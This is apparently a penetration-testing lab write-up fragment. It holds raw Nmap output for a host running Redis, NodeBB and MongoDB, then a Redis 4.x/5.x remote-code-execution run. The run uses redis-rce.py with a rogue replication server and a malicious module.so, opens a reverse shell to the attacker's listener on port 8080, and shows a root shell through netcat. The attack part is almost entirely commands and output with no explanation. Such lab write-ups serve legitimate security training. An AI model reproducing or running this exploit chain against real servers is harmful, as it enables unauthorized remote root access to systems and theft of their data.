### Nmap
```bash
# Nmap 7.94SVN scan initiated Mon Jan 22 20:12:35 2024 as: /usr/bin/nmap -Pn -sCV -p22,80,6379,8080,27017 --open -oN nmap/Script_TCP_192.168.220.69.nmap --system-dns --stats-every 2s 192.168.220.69
Nmap scan report for 192.168.220.69
Host is up (0.028s latency).

PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey: 
|   2048 09:80:39:ef:3f:61:a8:d9:e6:fb:04:94:23:c9:ef:a8 (RSA)
|   256 83:f8:6f:50:7a:62:05:aa:15:44:10:f5:4a:c2:f5:a6 (ECDSA)
|_  256 1e:2b:13:30:5c:f1:31:15:b4:e8:f3:d2:c4:e8:05:b5 (ED25519)
80/tcp    open  http       nginx 1.10.3
|_http-server-header: nginx/1.10.3
|_http-title: Welcome to nginx!
6379/tcp  open  redis      Redis key-value store 5.0.9
8080/tcp  open  http-proxy
| http-robots.txt: 3 disallowed entries 
|_/admin/ /reset/ /compose
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     X-DNS-Prefetch-Control: off
|     X-Frame-Options: SAMEORIGIN
|     X-Download-Options: noopen
|     X-Content-Type-Options: nosniff
|     X-XSS-Protection: 1; mode=block
|     Referrer-Policy: strict-origin-when-cross-origin
|     X-Powered-By: NodeBB
|     set-cookie: _csrf=jC0VnR-ncE3-D47L9zvFVJiM; Path=/
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 11098
|     ETag: W/"2b5a-dSI7kN1DN7Q/A6O5NUq7/V3iOuw"
|     Vary: Accept-Encoding
|     Date: Mon, 22 Jan 2024 19:12:41 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en-GB" data-dir="ltr" style="direction: ltr;" >
|     <head>
|     <title>Not Found | NodeBB</title>
|     <meta name="viewport" content="width&#x3D;device-width, initial-scale&#x3D;1.0" />
|     <meta name="content-type" content="text/html; charset=UTF-8" />
|     <meta name="apple-mobile-web-app-capable" content="yes" />
|     <meta name="mobile-web-app-capable" content="yes" />
|     <meta property="og:site_n"
|   GetRequest: 
|     HTTP/1.1 200 OK
|     X-DNS-Prefetch-Control: off
|     X-Frame-Options: SAMEORIGIN
|     X-Download-Options: noopen
|     X-Content-Type-Options: nosniff
|     X-XSS-Protection: 1; mode=block
|     Referrer-Policy: strict-origin-when-cross-origin
|     X-Powered-By: NodeBB
|     set-cookie: _csrf=TTpp9tpZO2ptX9lWSoulQMps; Path=/
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 18181
|     ETag: W/"4705-7sc62AegrR47pcBgS1pYY5H1PmE"
|     Vary: Accept-Encoding
|     Date: Mon, 22 Jan 2024 19:12:41 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en-GB" data-dir="ltr" style="direction: ltr;" >
|     <head>
|     <title>Home | NodeBB</title>
|     <meta name="viewport" content="width&#x3D;device-width, initial-scale&#x3D;1.0" />
|     <meta name="content-type" content="text/html; charset=UTF-8" />
|     <meta name="apple-mobile-web-app-capable" content="yes" />
|     <meta name="mobile-web-app-capable" content="yes" />
|     <meta property="og:site_name" content
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     X-DNS-Prefetch-Control: off
|     X-Frame-Options: SAMEORIGIN
|     X-Download-Options: noopen
|     X-Content-Type-Options: nosniff
|     X-XSS-Protection: 1; mode=block
|     Referrer-Policy: strict-origin-when-cross-origin
|     X-Powered-By: NodeBB
|     Allow: GET,HEAD
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 8
|     ETag: W/"8-ZRAf8oNBS3Bjb/SU2GYZCmbtmXg"
|     Vary: Accept-Encoding
|     Date: Mon, 22 Jan 2024 19:12:41 GMT
|     Connection: close
|     GET,HEAD
|   RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|_    Connection: close
|_http-title: Home | NodeBB
27017/tcp open  mongodb    MongoDB
| mongodb-databases: 
|   errmsg = command listDatabases requires authentication
|   ok = 0.0
|   codeName = Unauthorized
|_  code = 13
| mongodb-info: 
|   MongoDB Build info
|     openssl
|       compiled = OpenSSL 1.1.0l  10 Sep 2019
|       running = OpenSSL 1.1.0l  10 Sep 2019
|     storageEngines
|       3 = wiredTiger
|       0 = devnull
|       1 = ephemeralForTest
|       2 = mmapv1
|     javascriptEngine = mozjs
|     ok = 1.0
|     debug = false
|     sysInfo = deprecated
|     bits = 64
|     version = 4.0.18
|     maxBsonObjectSize = 16777216
|     allocator = tcmalloc
|     gitVersion = 6883bdfb8b8cff32176b1fd176df04da9165fd67
|     versionArray
|       3 = 0
|       0 = 4
|       1 = 0
|       2 = 18
|     buildEnvironment
|       target_arch = x86_64
|       distarch = x86_64
|       linkflags = -pthread -Wl,-z,now -rdynamic -Wl,--fatal-warnings -fstack-protector-strong -fuse-ld=gold -Wl,--build-id -Wl,--hash-style=gnu -Wl,-z,noexecstack -Wl,--warn-execstack -Wl,-z,relro
|       cc = /opt/mongodbtoolchain/v2/bin/gcc: gcc (GCC) 5.4.0
|       cxxflags = -Woverloaded-virtual -Wno-maybe-uninitialized -std=c++14
|       distmod = debian92
|       target_os = linux
|       cxx = /opt/mongodbtoolchain/v2/bin/g++: g++ (GCC) 5.4.0
|       ccflags = -fno-omit-frame-pointer -fno-strict-aliasing -ggdb -pthread -Wall -Wsign-compare -Wno-unknown-pragmas -Winvalid-pch -Werror -O2 -Wno-unused-local-typedefs -Wno-unused-function -Wno-deprecated-declarations -Wno-unused-but-set-variable -Wno-missing-braces -fstack-protector-strong -fno-builtin-memcmp
|     modules
|   Server status
|     errmsg = command serverStatus requires authentication
|     ok = 0.0
|     codeName = Unauthorized
|_    code = 13
| fingerprint-strings: 
|   FourOhFourRequest, GetRequest: 
|     HTTP/1.0 200 OK
|     Connection: close
|     Content-Type: text/plain
|     Content-Length: 85
|     looks like you are trying to access MongoDB over HTTP on the native driver port.
|   mongodb: 
|     errmsg
|     command serverStatus requires authentication
|     code
|     codeName
|_    Unauthorized
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.94SVN%I=7%D=1/22%Time=65AEBE29%P=x86_64-pc-linux-gnu%r
SF:(GetRequest,48E6,HTTP/1\.1\x20200\x20OK\r\nX-DNS-Prefetch-Control:\x20
SF:off\r\nX-Frame-Options:\x20SAMEORIGIN\r\nX-Download-Options:\x20noopen\
SF:r\nX-Content-Type-Options:\x20nosniff\r\nX-XSS-Protection:\x201;\x20mod
SF:e=block\r\nReferrer-Policy:\x20strict-origin-when-cross-origin\r\nX-Pow
SF:ered-By:\x20NodeBB\r\nset-cookie:\x20_csrf=TTpp9tpZO2ptX9lWSoulQMps;\x2
SF:0Path=/\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Leng
SF:th:\x2018181\r\nETag:\x20W/\"4705-7sc62AegrR47pcBgS1pYY5H1PmE\"\r\nVary
SF::\x20Accept-Encoding\r\nDate:\x20Mon,\x2022\x20Jan\x202024\x2019:12:41\
SF:x20GMT\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\r\n<html\x20la
SF:ng=\"en-GB\"\x20data-dir=\"ltr\"\x20style=\"direction:\x20ltr;\"\x20\x2
SF:0>\r\n<head>\r\n\t<title>Home\x20\|\x20NodeBB</title>\r\n\t<meta\x20nam
SF:e=\"viewport\"\x20content=\"width&#x3D;device-width,\x20initial-scale&#
SF:x3D;1\.0\"\x20/>\n\t<meta\x20name=\"content-type\"\x20content=\"text/ht
SF:ml;\x20charset=UTF-8\"\x20/>\n\t<meta\x20name=\"apple-mobile-web-app-ca
SF:pable\"\x20content=\"yes\"\x20/>\n\t<meta\x20name=\"mobile-web-app-capa
SF:ble\"\x20content=\"yes\"\x20/>\n\t<meta\x20property=\"og:site_name\"\x2
SF:0content")%r(HTTPOptions,1BF,"HTTP/1\.1\x20200\x20OK\r\nX-DNS-Prefetch-
SF:Control:\x20off\r\nX-Frame-Options:\x20SAMEORIGIN\r\nX-Download-Options
SF::\x20noopen\r\nX-Content-Type-Options:\x20nosniff\r\nX-XSS-Protection:\
SF:x201;\x20mode=block\r\nReferrer-Policy:\x20strict-origin-when-cross-ori
SF:gin\r\nX-Powered-By:\x20NodeBB\r\nAllow:\x20GET,HEAD\r\nContent-Type:\x
SF:20text/html;\x20charset=utf-8\r\nContent-Length:\x208\r\nETag:\x20W/\"8
SF:-ZRAf8oNBS3Bjb/SU2GYZCmbtmXg\"\r\nVary:\x20Accept-Encoding\r\nDate:\x20
SF:Mon,\x2022\x20Jan\x202024\x2019:12:41\x20GMT\r\nConnection:\x20close\r\
SF:n\r\nGET,HEAD")%r(RTSPRequest,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\
SF:nConnection:\x20close\r\n\r\n")%r(FourOhFourRequest,2D42,"HTTP/1\.1\x20
SF:404\x20Not\x20Found\r\nX-DNS-Prefetch-Control:\x20off\r\nX-Frame-Option
SF:s:\x20SAMEORIGIN\r\nX-Download-Options:\x20noopen\r\nX-Content-Type-Opt
SF:ions:\x20nosniff\r\nX-XSS-Protection:\x201;\x20mode=block\r\nReferrer-P
SF:olicy:\x20strict-origin-when-cross-origin\r\nX-Powered-By:\x20NodeBB\r\
SF:nset-cookie:\x20_csrf=jC0VnR-ncE3-D47L9zvFVJiM;\x20Path=/\r\nContent-Ty
SF:pe:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x2011098\r\nETag:
SF:\x20W/\"2b5a-dSI7kN1DN7Q/A6O5NUq7/V3iOuw\"\r\nVary:\x20Accept-Encoding\
SF:r\nDate:\x20Mon,\x2022\x20Jan\x202024\x2019:12:41\x20GMT\r\nConnection:
SF:\x20close\r\n\r\n<!DOCTYPE\x20html>\r\n<html\x20lang=\"en-GB\"\x20data-
SF:dir=\"ltr\"\x20style=\"direction:\x20ltr;\"\x20\x20>\r\n<head>\r\n\t<ti
SF:tle>Not\x20Found\x20\|\x20NodeBB</title>\r\n\t<meta\x20name=\"viewport\
SF:\x20content=\"width&#x3D;device-width,\x20initial-scale&#x3D;1\.0\"\x2
SF:0/>\n\t<meta\x20name=\"content-type\"\x20content=\"text/html;\x20charse
SF:t=UTF-8\"\x20/>\n\t<meta\x20name=\"apple-mobile-web-app-capable\"\x20co
SF:ntent=\"yes\"\x20/>\n\t<meta\x20name=\"mobile-web-app-capable\"\x20cont
SF:ent=\"yes\"\x20/>\n\t<meta\x20property=\"og:site_n);
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jan 22 20:13:36 2024 -- 1 IP address (1 host up) scanned in 61.09 seconds
```

#### Redis 4.x/5.x RCE
```bash
# python3 redis-rce.py -r 192.168.220.69 -p 6379 -L 192.168.45.164 -P 6379 -f RedisModules-ExecuteCommand/module.so

█▄▄▄▄ ▄███▄   ██▄   ▄█    ▄▄▄▄▄       █▄▄▄▄ ▄█▄    ▄███▄   
█  ▄▀ █▀   ▀  █  █  ██   █     ▀▄     █  ▄▀ █▀ ▀▄  █▀   ▀  
█▀▀▌  ██▄▄    █   █ ██ ▄  ▀▀▀▀▄       █▀▀▌  █   ▀  ██▄▄    
█  █  █▄   ▄▀ █  █  ▐█  ▀▄▄▄▄▀        █  █  █▄  ▄▀ █▄   ▄▀ 
  █   ▀███▀   ███▀   ▐                  █   ▀███▀  ▀███▀   
 ▀                                     ▀                   


[*] Connecting to  192.168.220.69:6379...
[*] Sending SLAVEOF command to server
[+] Accepted connection from 192.168.220.69:6379
[*] Setting filename
[+] Accepted connection from 192.168.220.69:6379
[*] Start listening on 192.168.45.164:6379
[*] Tring to run payload
[+] Accepted connection from 192.168.220.69:42529
[*] Closing rogue server...

[+] What do u want ? [i]nteractive shell or [r]everse shell or [e]xit: r
[*] Open reverse shell...
[*] Reverse server address: 192.168.45.164
[*] Reverse server port: 8080
[+] Reverse shell payload sent.
[*] Check at 192.168.45.164:8080
[*] Clean up..

----------------

# nc -nvlp 8080           

listening on [any] 8080 ...
connect to [192.168.45.164] from (UNKNOWN) [192.168.220.69] 58194
whoami
root